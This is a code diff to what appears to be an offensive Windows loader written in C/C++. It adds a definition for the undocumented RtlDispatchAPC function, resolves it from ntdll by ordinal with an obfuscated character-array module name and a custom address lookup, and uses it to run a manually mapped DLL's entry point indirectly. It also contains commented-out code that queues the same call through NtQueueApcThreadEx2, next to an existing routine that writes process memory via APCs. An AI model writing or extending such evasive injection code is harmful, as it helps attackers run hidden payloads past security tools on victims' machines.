@@ -954,6 +954,22 @@ typedef NTSTATUS (NTAPI *NtQueueApcThreadEx2_t)(
 typedef ULONG (NTAPI *NtCreateThreadEx_t)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
 
 
+//
+// This is used as SystemArgument3 if QueueUserAPC
+// was used to queue the APC.
+//
+typedef union _APC_ACTIVATION_CTX { 
+    ULONG_PTR Value;
+    HANDLE hActCtx;
+} APC_ACTIVATION_CTX;
+
+//deinfe RtlDispatchAPC:
+typedef NTSTATUS (NTAPI *RtlDispatchAPC_t)(
+    PAPCFUNC pfnAPC,
+    ULONG_PTR dwData,
+    APC_ACTIVATION_CTX ApcActivationContext
+);
+
 
 // Function to write memory using APCs with an option to choose the thread creation method
 DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength, BOOL useRtlCreateUserThread, BOOL bUseCreateThreadpoolWait) {
@@ -1659,7 +1675,64 @@ int main(int argc, char *argv[])
     }
     // Use function pointer to call the DLL entry point 2nd time.
     DLLEntry DllEntry1 = (DLLEntry)((unsigned long long int)fileBase + entryPointRVA1);
-    (*DllEntry1)((HINSTANCE)fileBase, DLL_PROCESS_ATTACH, 0);
+    // (*DllEntry1)((HINSTANCE)fileBase, DLL_PROCESS_ATTACH, 0);
+
+    const char getLib[] = { 'n', 't', 'd', 'l', 'l', 0 };
+    RtlDispatchAPC_t RtlDispatchAPC = (RtlDispatchAPC_t)dynamic::NotGetProcAddress(GetModuleHandleA(getLib), MAKEINTRESOURCE(8));
+    if(!RtlDispatchAPC) {
+        printf("[-] Failed to locate RtlDispatchAPC.\n");
+        return 1;
+    } else {
+        printf("[+] RtlDispatchAPC located.\n");
+        //print the func addr:
+        printf("[+] RtlDispatchAPC: %p\n", RtlDispatchAPC);
+    }
+
+    // call RtlDispatchAPC to execute DllEntry1:
+    // Prepare the arguments for RtlDispatchAPC
+    PAPCFUNC apcFunction = (PAPCFUNC)DllEntry1;
+    ULONG_PTR apcArgument1 = (ULONG_PTR)fileBase;
+    APC_ACTIVATION_CTX apcArgument2;
+    apcArgument2.Value = 0; // Initialize the union as needed
+
+    // Call RtlDispatchAPC with the prepared arguments
+    printf("[+] Calling RtlDispatchAPC to execute DllEntry.\n");
+    result = RtlDispatchAPC(apcFunction, apcArgument1, apcArgument2);
+
+    if(result != STATUS_SUCCESS) {
+        printf("[-] RtlDispatchAPC failed to execute DllEntry1. Status: %x\n", result);
+        return 1;
+    } else {
+        printf("[+] DllEntry1 executed successfully.\n");
+    }
+    //pass RtlDispatchAPC_t to pNtQueueApcThread to call DllEntry1:
+    // const char NtQueueFutureApcEx2Str[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '2', 0 };
+    // NtQueueApcThreadEx2_t pNtQueueApcThread = (NtQueueApcThreadEx2_t)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtQueueFutureApcEx2Str);
+
+    // // Prepare the arguments for NtQueueApcThreadEx2
+    // HANDLE hThread = GetCurrentThread();
+    // HANDLE userApcReserveHandle = NULL; // Adjust as necessary
+    // QUEUE_USER_APC_FLAGS queueUserApcFlags = QUEUE_USER_APC_FLAGS_NONE;
+
+    // // Call NtQueueApcThreadEx2 with the prepared arguments
+    // result = pNtQueueApcThread(
+    //     hThread,
+    //     userApcReserveHandle,
+    //     queueUserApcFlags,
+    //     (PVOID)RtlDispatchAPC,
+    //     (PVOID)apcFunction,
+    //     (PVOID)apcArgument1,
+    //     (PVOID)&apcArgument2
+    // ); 
+    // if(result != STATUS_SUCCESS) {
+    //     printf("[-] NtQueueApcThreadEx2 failed to execute DllEntry1. Status: %x\n", result);
+    //     return 1;
+    // } else {
+    //     printf("[+] DllEntry1 executed successfully.\n");
+    // }
+
+
+    
 
     // CloseHandle(hThread);
     // FreeLibrary(hDll);
